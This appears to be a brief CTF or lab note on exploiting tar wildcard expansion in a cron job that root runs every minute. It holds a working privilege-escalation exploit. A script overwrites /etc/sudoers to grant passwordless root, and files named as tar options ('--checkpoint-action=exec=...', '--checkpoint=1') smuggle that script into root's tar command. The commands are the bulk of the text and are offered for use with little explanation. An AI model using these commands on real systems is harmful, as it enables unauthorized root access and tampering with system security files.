## Tar
https://www.sevenlayers.com/index.php/blog/353-exploiting-tar-wildcards
Vulnerable script executed every 1 min. by root
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
 We can exploit it
 ```bash
 $ echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
 
 $ echo "" > "--checkpoint-action=exec=sh privesc.sh"
 
 $ echo "" > --checkpoint=1
 ```
 Once the cron job is executed, we are in the sudoers